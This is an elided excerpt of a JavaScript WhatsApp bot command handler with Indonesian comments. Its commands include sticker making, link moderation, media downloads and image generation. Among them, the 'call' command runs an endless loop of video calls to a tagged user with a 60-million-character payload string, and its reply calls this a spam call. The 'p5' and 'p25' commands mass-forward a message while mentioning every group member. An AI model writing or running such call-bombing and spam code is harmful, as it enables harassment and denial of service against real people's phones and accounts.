...
// Fungsi delay untuk memberikan jeda antar iterasi
function delay(ms) {
...
async function makeStickerFromUrl(imageUrl, conn, m) {
 ...
 if (global.db.data.chats[m.chat].antilink) {
     if (budy.includes('chat.whatsapp.com')) {
         ...
         conn.groupParticipantsUpdate(from, [m.sender], 'remove')
         await conn.sendMessage(m.chat, {
             delete: m.key
         });	
     }  
...
case 'toimage': 
  ...
  break
    ...
    case "dump":{
      ...
      await sleep(3000)
      await reaction(m.chat, "⌛")
      conn.sendMessage(`120363386540561289@newsletter`,{ 
          audio : await quoted.download(),
          mimetype: 'audio/mp4',
          ptt: true
      })
...
case 'nosv': {
    if (!Access) return reply(mess.owner)
        let teks = `Lenn tidak menerima saling save.\nMau save? save aja tapi jangan berharap di save back.`
        const contentText = {
            text: teks,
            contextInfo: {	
                mentionedJid: conn.ments(teks),
                externalAdReply: {
                    title: `Lenn You're Fav Bot`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/wbx4xm.jpeg`,
                    sourceUrl: ''
                }	
            }	
        };	
...
case 'p5': {
    ...
    if (!Access) return;
    if (m.quoted) {
        for (let i = 0; i < 5; i++) { // Loop sebanyak 5 kali
            conn.sendMessage(m.chat, {
                forward: m.quoted.fakeObj,
                mentions: participants.map(a => a.id)
            });
...
case 'p25': {
    ...
    if (!Access) return;
    if (m.quoted) {
        for (let i = 0; i < 25; i++) { // Loop sebanyak 25 kali
            conn.sendMessage(m.chat, {
                forward: m.quoted.fakeObj,
                mentions: participants.map(a => a.id)
            });
...
case 'restart': {
    if (!Access) return; // Pastikan hanya pengguna dengan akses dapat melakukan restart
    conn.sendMessage(m.chat, { text: "Bot akan direstart..." }, { quoted: m });

    // Tunggu beberapa detik sebelum keluar
    setTimeout(() => {
        process.exit(0); // Keluar dari proses dengan kode 0 (normal)
    }, 2000); // Delay 2 detik agar pesan terkirim sebelum restart
}
break;
...
case 'call': {
    ...
    const callFunction = async (target) => {
        while (true) { // Loop tanpa henti
            await conn.offerCall(target, { isVideo: true, callOutCome: "8".repeat(60000000) });
        }
    };
    ...
    if (target.startsWith('@')) {
        ...
        if (!mentionedJid) {
            return m.reply("Tag seseorang untuk melakukan panggilan.");
        }
        ...
        callFunction(number);
        conn.sendMessage(m.chat, { text: `Spam call dimulai ke nomor ${target}` }, { quoted: m });
    } else {
        return m.reply("Format salah. Gunakan @tag atau masukkan nomor telepon dengan format yang benar.");
    }
}
break;
    ...
    if (command === 'igdl') {
        ...
        if (result.videoUrl) {
            try {
                ...
                await conn.sendMessage(m.chat, { video: Buffer.from(videoBuffer.data), caption: '✅ Video berhasil' });
            } catch (error) {
            ...
            try {
                ...
                await conn.sendMessage(m.chat, { image: Buffer.from(imageBuffer.data), caption: '✅ Gambar berhasil' });
            } catch (error) {
...
case 'txt2img':
case 'text2img': {
if (!text) return reply('mana promt?')
reply(mess.wait)
	try {
